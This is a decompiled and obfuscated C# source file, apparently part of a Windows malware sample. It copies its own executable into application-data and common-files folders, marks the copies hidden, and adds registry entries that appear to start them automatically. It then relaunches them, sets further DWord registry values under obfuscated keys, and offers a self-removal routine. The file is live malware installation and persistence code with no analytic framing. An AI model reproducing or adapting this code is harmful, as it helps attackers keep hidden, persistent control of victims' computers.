using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace ns0;

internal class Class9 : Class8
{
	private static Mutex mutex_0;

	public static void smethod_2()
	{
		smethod_8();
		smethod_7();
		smethod_3();
		Class8.smethod_0();
	}

	private static void smethod_3()
	{
		RegistryKey registryKey;
		if (Class2.bool_0)
		{
			Class2.string_4[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_5() + Class2.string_4[0];
			Class2.string_4[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_5() + Class2.string_4[1];
			registryKey = Registry.LocalMachine;
		}
		else
		{
			Class2.string_4[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_5() + Class2.string_4[0];
			Class2.string_4[1] = Environment.GetEnvironmentVariable(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_4()) + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_5() + Class2.string_4[1];
			registryKey = Registry.CurrentUser;
		}
		if (smethod_6())
		{
			return;
		}
		try
		{
			string[] string_ = Class2.string_4;
			foreach (string text in string_)
			{
				if (!Class7._0024MD_002422(text))
				{
					File.Copy(Class2.string_6, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
		try
		{
			if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18()) == null)
			{
				registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18());
			}
			if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19()) == null)
			{
				registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19());
			}
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18(), writable: true)!.SetValue(Class2.string_5[0], Class2.string_4[0]);
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19(), writable: true)!.SetValue(Class2.string_5[1], Class2.string_4[1]);
		}
		catch
		{
		}
		try
		{
			mutex_0.Close();
			string[] string_2 = Class2.string_4;
			foreach (string text2 in string_2)
			{
				Process.Start(text2, string.Empty);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static void smethod_4(string string_0)
	{
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
		Class7.smethod_4(string_0);
		smethod_5();
	}

	private static void smethod_5()
	{
		Class8.smethod_1();
		RegistryKey registryKey = ((!Class2.bool_0) ? Registry.CurrentUser : Registry.LocalMachine);
		try
		{
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18(), writable: true)!.DeleteValue(Class2.string_5[0]);
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19(), writable: true)!.DeleteValue(Class2.string_5[1]);
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class2.string_4;
			foreach (string path in string_)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	private static bool smethod_6()
	{
		string[] string_ = Class2.string_4;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!Class7._0024MD_002422(string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static void smethod_7()
	{
		RegistryKey registryKey = ((!Class2.bool_0) ? Registry.CurrentUser : Registry.LocalMachine);
		try
		{
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_20(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_21(), _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_22(), RegistryValueKind.DWord);
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_20(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_23(), _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_24(), RegistryValueKind.DWord);
			registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_25(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_26(), _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_24(), RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static void smethod_8()
	{
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class2.string_0);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
